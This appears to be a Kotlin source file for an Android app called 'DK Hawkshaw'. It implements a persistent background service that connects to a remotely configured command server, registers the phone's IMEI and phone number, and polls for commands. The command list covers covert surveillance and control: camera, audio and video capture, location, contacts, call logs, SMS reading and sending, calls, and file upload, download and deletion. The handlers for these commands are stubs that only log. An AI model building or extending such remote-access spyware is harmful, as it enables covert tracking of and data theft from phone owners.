package com.hawkshaw.library.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.hawkshaw.app.MainActivity
import com.hawkshaw.library.config.RemoteConfig
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.network.ApiService
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import com.google.gson.Gson
import com.hawkshaw.app.BuildConfig
import com.hawkshaw.library.deviceinfo.DeviceInfo
import com.hawkshaw.library.network.DeviceRegistrationRequest
import org.json.JSONObject
import java.net.URI
import java.util.concurrent.TimeUnit

class PrivatePushService : Service() {

    private val TAG = "PrivatePushService"
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var socket: Socket? = null
    private var isConnected = false


    // Notification
    private val CHANNEL_ID = "private_push_channel"
    private val NOTIFICATION_ID = 1001

    // Polling
    private val POLLING_INTERVAL = 30_000L // 30 seconds

    // Socket options
    private val SOCKET_TIMEOUT = 60_000L // 60 seconds

    // API client
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .addInterceptor(HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        })
        .build()

    // API service
    private lateinit var apiService: ApiService

    // Notification channel ID
    private val NOTIFICATION_CHANNEL_ID = "private_push_service_channel"
    private val NOTIFICATION_CHANNEL_NAME = "Private Push Service"

    // Correctly get deviceId from Prefs
    private val deviceId: String
        get() = getSharedPreferences("hawkshaw_prefs", Context.MODE_PRIVATE)
            .getString("device_id", "") ?: ""

    companion object {
        private const val TAG = "PrivatePushService"

        fun startService(context: Context) {
            val intent = Intent(context, PrivatePushService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stopService(context: Context) {
            val intent = Intent(context, PrivatePushService::class.java)
            context.stopService(intent)
        }

        private val gson = Gson()
    }

    override fun onCreate() {
        super.onCreate()
        // Initialize API service with application context
        apiService = ApiService(applicationContext)

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        initializeSocket()
        startCommandPolling()
        logMessage("Service created")
        Log.d(TAG, "Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        logMessage("onStartCommand called")
        Log.d(TAG, "onStartCommand called")
        return START_STICKY // Restart if killed
    }



    private fun logMessage(message: String, e: Throwable? = null) {
        try {
            if (e != null) {
                Log.e(TAG, message, e)
            } else {
                Log.d(TAG, message)
            }
        } catch (logError: Exception) {
            // Fallback in case logging fails
            System.err.println("$TAG: $message")
            e?.printStackTrace()
        }
    }

    private fun disconnectSocket() {
        try {
            socket?.disconnect()
            socket?.off()
            socket = null
            isConnected = false
            logMessage("Socket disconnected")
            Log.d(TAG, "Socket disconnected")
        } catch (e: Exception) {
            logMessage("Error disconnecting socket: ${e.message}", e)
            Log.d(TAG, "Error disconnecting socket: ${e.message}")
        }
    }

    private fun createNotification(message: String = "Connected to private server"): Notification {
        // Create notification channel for Android O and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service for DK Hawkshaw"
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }

        // Create pending intent to open app when notification is tapped
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        // Build and return the notification
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("DK Hawkshaw")
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_dialog_info) // Using system icon as fallback
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        disconnectSocket()
        serviceScope.cancel()
        logMessage("Service destroyed")
    }



    private fun logMessage(tag: String = TAG, message: String, e: Throwable? = null) {
        try {
            if (e != null) {
                Log.e(tag, message, e)
            } else {
                Log.d(tag, message)
            }
        } catch (logError: Exception) {
            // Fallback in case logging fails
            System.err.println("$tag: $message")
            e?.printStackTrace()
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null // Not using binding
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Maintains connection to private server"
                setShowBadge(false)
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun initializeSocket() {
        try {
            // CORRECT: Get the URL from the single source of truth, RemoteConfig.
            val serverUrl = RemoteConfig.getInstance(this).getWebsocketUri()
            
            if (serverUrl.isBlank()) {
                logMessage("Cannot initialize socket: server URL is empty")
                Log.d(TAG, "Cannot initialize socket: server URL is empty")
                return
            }

            // Disconnect existing socket if any
            disconnectSocket()

            // Configure socket options
            val options = IO.Options().apply {
                transports = arrayOf("websocket")
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 5000
                timeout = SOCKET_TIMEOUT
            }

            // Create and configure socket
            socket = IO.socket(URI.create(serverUrl), options).apply {
                on(Socket.EVENT_CONNECT) {
                    isConnected = true
                    logMessage("Socket connected")
                    Log.d(TAG, "Socket connected")
                    updateNotification("Connected to server")
                    registerWithServer()
                }

                on(Socket.EVENT_DISCONNECT) {
                    isConnected = false
                    logMessage("Socket disconnected")
                    Log.d(TAG, "Socket disconnected")
                    updateNotification("Disconnected - Reconnecting...")
                }

                on(Socket.EVENT_CONNECT_ERROR) { args ->
                    val error = args.firstOrNull() as? Exception
                    logMessage("Socket connection error: ${error?.message ?: "Unknown error"}", error)
                    Log.d(TAG, "Socket connection error: ${error?.message ?: "Unknown error"}")
                }

                on("command") { args ->
                    try {
                        val commandJson = args.firstOrNull() as? JSONObject
                        if (commandJson != null) {
                            // Command ID is not available in the Command class
                            // Consider using a different identifier or tracking mechanism
                            Log.e(TAG, "Failed to process command of type: ${commandJson.optString("type")}")
                        }
                    } catch (e: Exception) {
                        logMessage("Error processing command: ${e.message}", e)
                        Log.d(TAG, "Error processing command: ${e.message}")

                    }
                }
            }

            // Connect to the server
            socket?.connect()

        } catch (e: Exception) {
            logMessage("Error initializing socket: ${e.message}", e)
            Log.d(TAG, "Error initializing socket: ${e.message}")
        }
    }

    private fun updateNotification(message: String) {
        val notification = createNotification(message)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    private fun registerWithServer() {
        serviceScope.launch {
            try {
                val currentDeviceId = deviceId.ifEmpty { return@launch }

                val imei = getSharedPreferences("hawkshaw_prefs", Context.MODE_PRIVATE)
                    .getString("imei", "") ?: ""
                val phoneNumber = getSharedPreferences("hawkshaw_prefs", Context.MODE_PRIVATE)
                    .getString("phone_number", "") ?: ""

                val deviceInfo = DeviceRegistrationRequest(
                    deviceId = currentDeviceId,
                    deviceName = Build.MODEL,
                    model = Build.MODEL,
                    manufacturer = Build.MANUFACTURER,
                    androidVersion = Build.VERSION.RELEASE,
                    apiLevel = Build.VERSION.SDK_INT,
                    imei = imei,
                    phoneNumber = phoneNumber,
                    fcmToken = null, // Explicitly set to null since we're not using Firebase
                    appVersion = packageManager.getPackageInfo(packageName, 0).versionName
                )

                when (val response = apiService.registerDevice(deviceInfo)) {
                    is ApiResponse.Success<*> -> {
                        logMessage("Successfully registered device with server")
                        Log.d(TAG, "Successfully registered device with server")
                        // Start polling for commands if not already started
                        startCommandPolling()
                    }
                    is ApiResponse.Error<*> -> {
                        logMessage("Failed to register device: ${response.errorMessage}")
                        Log.d(TAG, "Failed to register device: ${response.errorMessage}")
                    }
                    is ApiResponse.InProgress<*> -> {
                        logMessage("Device registration in progress...")
                        Log.d(TAG, "Device registration in progress...")
                    }
                    else -> {
                        logMessage("Unknown response type received")
                        Log.d(TAG, "Unknown response type received")
                    }
                }
            } catch (e: Exception) {
                logMessage("Error registering with server: ${e.message}", e)
                Log.d(TAG, "Error registering with server: ${e.message}")
            }
        }
    }

    private fun startCommandPolling() {
        serviceScope.launch {
            while (isActive) {
                try {
                    if (!isConnected) {
                        // Only poll if socket is not connected
                        pollForCommands()
                    }
                    delay(POLLING_INTERVAL)
                } catch (e: Exception) {
                    logMessage("Error in command polling: ${e.message}", e)
                    Log.d(TAG, "Error in command polling: ${e.message}")
                    delay(5000) // Wait 5 seconds before retrying on error
                }
            }
        }
    }

    private suspend fun pollForCommands() {
        try {
            val currentDeviceId = deviceId.ifEmpty { return@pollForCommands }

            when (val response = apiService.getPendingCommands()) {
                is ApiResponse.Success<*> -> {
                    @Suppress("UNCHECKED_CAST")
                    val commands = response.result as? List<Command> ?: emptyList()

                    if (commands.isNotEmpty()) {
                        logMessage("Received ${commands.size} pending commands")
                        Log.d(TAG, "Received ${commands.size} pending commands")

                        // Process each command
                        commands.forEach { command ->
                            try {
                                val commandJson = JSONObject(gson.toJson(command, Command::class.java))
                                handleIncomingCommand(commandJson)
                            } catch (e: Exception) {
                                logMessage("Error processing command of type ${command.type}: ${e.message}", e)
                                Log.d(TAG, "Error processing command of type ${command.type}: ${e.message}")
                            }
                        }

                        // Commands don't have IDs in this implementation
                        // Consider adding command IDs or using a different tracking mechanism
                    }
                }
                is ApiResponse.Error<*> -> {
                    logMessage("Failed to get pending commands: ${response.errorMessage}")
                    Log.d(TAG, "Failed to get pending commands: ${response.errorMessage}")
                }
                is ApiResponse.InProgress<*> -> {
                    logMessage("Fetching pending commands in progress...")
                    Log.d(TAG, "Fetching pending commands in progress...")
                }
                else -> {
                    logMessage("Unknown response type received when polling for commands")
                    Log.d(TAG, "Unknown response type received when polling for commands")
                }
            }
        } catch (e: Exception) {
            logMessage("Error polling for commands: ${e.message}", e)
            Log.d(TAG, "Error polling for commands: ${e.message}")
        }
    }

    private fun handleIncomingCommand(commandJson: JSONObject) {
        try {
            val command = gson.fromJson(commandJson.toString(), Command::class.java)
            logMessage("Processing command: ${command.type}")
            Log.d(TAG, "Processing command: ${command.type}")

            when (command.type) {
                Command.CommandType.Vibrate -> handleVibrateCommand(command)
                Command.CommandType.PushLocation -> handleGetLocationCommand(command)
                Command.CommandType.TakePicture -> handleTakePictureCommand(command)
                Command.CommandType.RecordAudio -> handleRecordAudioCommand(command)
                Command.CommandType.RecordVideo -> handleRecordVideoCommand(command)
                Command.CommandType.PushContacts -> handleGetContactsCommand(command)
                Command.CommandType.PushCallLogs -> handleGetCallLogsCommand(command)
                Command.CommandType.PushMessages -> handleGetSMSCommand(command)
                Command.CommandType.SendMessage -> handleSendSMSCommand(command)
                Command.CommandType.MakeCall -> handleMakeCallCommand(command)
                Command.CommandType.OpenDeeplink -> handleOpenURLCommand(command)
                Command.CommandType.PushInstalledAppList -> handleGetInstalledAppsCommand(command)
                Command.CommandType.PushAppLogs -> handleGetAppLogsCommand(command)
                Command.CommandType.PushDeviceInfo -> handleGetDeviceInfoCommand(command)
                Command.CommandType.OpenApp -> handleOpenAppCommand(command)
                Command.CommandType.RunAccessibilityCommand -> handleRunShellCommandCommand(command)
                Command.CommandType.PushFile -> handleDownloadFileCommand(command)
                Command.CommandType.PushFiles -> handleUploadFileCommand(command)
                Command.CommandType.DeleteFile -> handleDeleteFileCommand(command)
                Command.CommandType.PushFileExplorerWalk -> handleGetFileListCommand(command)
                Command.CommandType.PushThumbnails -> handleGetFileCommand(command)
                else -> logMessage("Unhandled command type: ${command.type}")

            }
        } catch (e: Exception) {
            logMessage("Error handling incoming command: ${e.message}", e)
            Log.d(TAG, "Error handling incoming command: ${e.message}")
        }
    }

    // Stub handler methods for each command type
    private fun handleVibrateCommand(command: Command) { logMessage("handleVibrateCommand: ${command.type}") }
    private fun handleGetLocationCommand(command: Command) { logMessage("handleGetLocationCommand: ${command.type}") }
    private fun handleTakePictureCommand(command: Command) { logMessage("handleTakePictureCommand: ${command.type}") }
    private fun handleRecordAudioCommand(command: Command) { logMessage("handleRecordAudioCommand: ${command.type}") }
    private fun handleRecordVideoCommand(command: Command) { logMessage("handleRecordVideoCommand: ${command.type}") }
    private fun handleGetContactsCommand(command: Command) { logMessage("handleGetContactsCommand: ${command.type}") }
    private fun handleGetCallLogsCommand(command: Command) { logMessage("handleGetCallLogsCommand: ${command.type}") }
    private fun handleGetSMSCommand(command: Command) { logMessage("handleGetSMSCommand: ${command.type}") }
    private fun handleSendSMSCommand(command: Command) { logMessage("handleSendSMSCommand: ${command.type}") }
    private fun handleMakeCallCommand(command: Command) { logMessage("handleMakeCallCommand: ${command.type}") }
    private fun handleOpenURLCommand(command: Command) { logMessage("handleOpenDeeplinkCommand: ${command.type}") }
    private fun handleGetInstalledAppsCommand(command: Command) { logMessage("handleGetInstalledAppsCommand: ${command.type}") }
    private fun handleGetAppLogsCommand(command: Command) { logMessage("handleGetAppLogsCommand: ${command.type}") }
    private fun handleGetDeviceInfoCommand(command: Command) { logMessage("handleGetDeviceInfoCommand: ${command.type}") }
    private fun handleOpenAppCommand(command: Command) { logMessage("handleOpenAppCommand: ${command.type}") }
    private fun handleRunShellCommandCommand(command: Command) { logMessage("handleRunAccessibilityCommand: ${command.type}") }
    private fun handleDownloadFileCommand(command: Command) { logMessage("handlePushFileCommand: ${command.type}") }
    private fun handleUploadFileCommand(command: Command) { logMessage("handlePushFilesCommand: ${command.type}") }
    private fun handleDeleteFileCommand(command: Command) { logMessage("handleDeleteFileCommand: ${command.type}") }
    private fun handleGetFileListCommand(command: Command) { logMessage("handlePushFileExplorerWalkCommand: ${command.type}") }
    private fun handleGetFileCommand(command: Command) { logMessage("handlePushThumbnailsCommand: ${command.type}") }
}
